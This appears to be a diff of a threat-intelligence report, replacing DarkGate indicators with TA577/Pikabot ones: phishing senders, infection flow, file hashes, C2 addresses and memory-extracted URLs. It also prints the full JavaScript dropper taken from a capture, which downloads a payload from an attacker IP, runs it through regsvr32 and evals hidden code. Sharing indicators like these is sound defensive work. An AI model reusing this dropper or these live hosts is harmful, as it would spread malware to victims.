@@ -1,100 +1,132 @@
-THREAT IDENTIFICATION:  DARKGATE
+THREAT IDENTIFICATION: TA577 / PIKABOT
 
-INFECTION CHAIN
-.eml -> .pdf -> TDS url -> redirect url -> .cab -> .url -> msi -> .a3x (AutoIt Script) -> payload
+SUBJECTS OBSERVED
+All subjects were from previously stolen email threads.
 
-OBSERVED SUBJECTS
-CASE#2451
-J218634679 Approval
-Nr: J8149253138
-RE: FWD: E-E's
-W951898152 Approval
+SENDERS OBSERVED
+mhermann@functionsandcatering.com
+pdyrsu@kayclaudy.ht
+zconroy@poupaqui.pt
 
-OBSERVED SENDERS
-director@unitedkingdontube.com
-energy@wittybank.com
-marketing@welcomehygyxyi.com
-springenergy@welcomehygyxyi.com
-support@welcomemywowea.com
+INFECTION FLOW
+eml -> attached .zip -> .xlsx -> .js -> .dll
 
-PDF FILE HASHES
-71b53c937101d20cbe883c1d14bbd9f1
-b4b936d38cf689bc13ffc7dbbe96c426
-df9c81279ef06878e63048a4eb31720e
-e169d301fd7d2ce82d875a51f859343d
+EMAIL BODY ADDITION
+Good day,
+I forwarded a document to you yesterday. Were it arrive you?
 
-PDF FILE NAMES
-February_-2023_3407794746.pdf
-feb-case_-2023_0995091891.pdf
-feb-case_-2024_4994032049.pdf
-info_-2023_0075679927.pdf
+ATTACHED ZIP FILE HASH
+ILLUMDY.zip
+ec608a648c66a3574d282f818a5105a2
 
-INITIAL REDIRECT URLS
-https://monitor.clickcease.com//tracker/tracker?id=my2024mWEUFIqIrNt15&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=LcZciOKudg&session_id=hTn63LPMxcK5cF7ehCPd&id=9mGUh&filter=CeRtSXkPOl-NrJRm&lang=zh&locale=GB
+XLSX FILE HASH
+ILLUMDY.xlsx
+39c90b991a0f36ff8b84e55886ca08d4
 
-https://monitor.clickcease.com//tracker/tracker?id=mi2024qXUOFIqArNt30&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=OjYyUEzwaR&session_id=QvWGtebYhr9elmU91dBn&id=l8xas&filter=UtEyEFspMZ-XCAui&lang=ru&locale=GB
+XLSX FILE METADATA
+Author: admin
+Last Modified By: admin
 
-https://monitor.clickcease.com//tracker/tracker?id=aj2024yYAAFIqArNt96&adpos=&nw=a&url=https://proniklsu63nenick.com?utm_content=ZbwOgniSIu&session_id=FSiLGWjl8hCOXKDhEJ0O&id=BMJPl&filter=hwYyrfcOPM-hwBdo&lang=zh&locale=DE
+ADDITIONAL FILE HASH
+c
+17f3eddc10916861d1a2d7e961eb6561
 
-SECONDARY REDIRECT URLS
-https://proniklsu63nenick.com/?utm_content=LcZciOKudg
-https://proniklsu63nenick.com/?utm_content=OjYyUEzwaR
-https://proniklsu63nenick.com/?utm_content=ZbwOgniSIu
-https://proniklsu63nenick.com/?utm_content=UyoUlPywvZ
+JAVASCRIPT FILE DOWNLOAD URL
+file:///\\85.195.115.20\share\1.js
 
-CAB FILE DOWNLOAD URLS
-https://grpt.ca/js/cab/cases_2024-02-12_16-01-13-036815_99.cab
-https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-847515_50.cab
-https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-996419_89.cab
-https://grpt.ca/js/cab/cases_2024-02-12_16-01-12-884370_59.cab
+JAVASCRIPT FILE DOWNLOAD COMMAND
+"C:\Windows\System32\WScript.exe" "\\85.195.115.20\share\1.js" 
 
-CAB FILE HASHES
-58888d54d24b730ab10fcd26cc871d19
-71e9ca611b1215c5eb3f2a2887021fda
-90cb2bce91cc50e9f1244c94bd714be7
-db8c6a7db9c535ffd07a12092a431e13
-(The files were named: "cases_2024-02-12_16-01-[0-9]{2}-[0-9]{6}_[0-9]{2}\.cab" )
+JAVASCRIPT CONTENTS (EXTRACTED FOM PCAP)
+/*
+var S5 = new ActiveXObject("msxml2.xmlhttp"), hp = new ActiveXObject("adodb.stream");
 
-CAB FILE NAMES OBSERVED
-cases_2024-02-12_16-01-13-036815_99.cab
-cases_2024-02-12_16-01-12-847515_50.cab
-cases_2024-02-12_16-01-12-884370_59.cab
-cases_2024-02-12_16-01-12-996419_89.cab
+S5.open("GET", "http://77.245.76.113/1s6iL/BtCxD", false);
+S5.send();
 
-URL FILE HASHES
-a3a4438b1ecf4620d6eb2195efabfd45
-(File names were the same as the .cab files above but with .url extensions)
+if(S5.status === 200)
+{
+	hp.type = 1;
+	hp.open();
+	hp.write(S5.responsebody);
+	hp.savetofile("SH.jpg", 2);
+	hp.close();
+}
+*/
 
-URL FILE PROPERTIES
-file://95.164.63.54@80/documents/build-x64.zip/build-x64.msi
+/*
+var S9 = new ActiveXObject("wscript.shell");
+*/
 
-MSI FILE DOWNLOAD URL
-95.164.63.54:80/documents/build-x64.zip/build-x64.msi
+/*
+S9.exec("regsvr32 SH.jpg");
+*/
 
-MSI FILE HASH
-build-x64.msi
-2999391319cda1be5dacfaf5b05062b2
+function YQ(k0)
+{
+	var Qr = new ActiveXObject("scripting.filesystemobject");
+	var f1 = Qr.opentextfile(WScript.ScriptFullName, 1);
+	return(f1.readall());
+}
+var aF = /\/\*([\s\S]*?)\*\//g;
+var B2;
 
-AUTOIT SCRIPT FILE HASH
-script.a3x
-6354b28ac4bc8fa465d80c3ea3893116
+do
+{
+	B2 = aF.exec(YQ());
+	if(B2)
+	{
+			eval(B2[1]);
+	}
+}
+while(B2);
+WScript.quit();
 
-ADDITIONAL FILE HASHES
-efkedaa
-3de6724322115d284769907259d72a82
+PAYLOAD DOWNLOAD URL
+http://77.245.76.113/1s6iL/BtCxD
 
-test.txt
-45306f5622da212035662680f1c09e0e
+PAYLOAD FILE HASH
+BtCxD
+9077167ffc15a50f701533f177562c1e
 
 UNPACKED PAYLOAD FILE HASH
-4d00000.exe
-8bb9319da6950b4709ec094f9babaa37
+2eb0000.ctfmon.exe
+874b9805a469517c1ff472f44b0fe5c8
 
-DARKGATE C2s
-http://prodomainnameeforappru.com:443/
+LIKELY C2s
+https://103.82.243.5:13785/
+https://108.61.78.17:13783/
+https://131.153.231.178:2221/
+https://155.138.147.62:2223/
+https://172.232.162.97:13783/
+https://172.232.189.10:1194/
+https://172.232.189.219:2224/
+https://37.60.242.85:9785/
+https://45.76.251.190:5631/
+https://86.38.225.105:13721/
+https://86.38.225.106:2221/
+https://86.38.225.109:13724/
+https://95.179.135.3:2225/
 
-MSI FILE CERTIFICATE INFORMATION
-Name: Inoellact EloubantTech Optimization Information Co., Ltd.
-Emai: Not available
-Signing Time: Tuesday, February 13, 2024 4:39:34 AM
+URLS EXTRACTED FROM MEMORY
+https://103.82.243.5:13785/
+https://103.82.243.5:13785/api/admin.usergroups.addChannels
+https://108.61.78.17:13783/
+https://108.61.78.17:13783/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
+https://108.61.78.17:13783/api/apps.permissions.scopes.list
+https://131.153.231.178:2221/api/admin.teams.admins.list
+https://155.138.147.62:2223/api/admin.teams.admins.list
+https://172.232.162.97:13783/api/admin.apps.restricted.list
+https://172.232.162.97:13783/api/api.test
+https://172.232.189.10:1194/
+https://172.232.189.10:1194/api/admin.inviteRequests.denied.list
+https://172.232.189.219:2224/api/apps.permissions.users.list
+https://37.60.242.85:9785/api/admin.conversations.restrictAccess.addGroup
+https://45.76.251.190:5631/api/admin.inviteRequests.list
+https://86.38.225.105:13721/
+https://86.38.225.105:13721/api/admin.teams.settings.setDiscoverability
+https://86.38.225.105:13721/api/apps.permissions.users.list
+https://86.38.225.106:2221/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
+https://86.38.225.109:13724/api/admin.inviteRequests.deny
+https://95.179.135.3:2225/api/admin.teams.settings.setDiscoverability
 
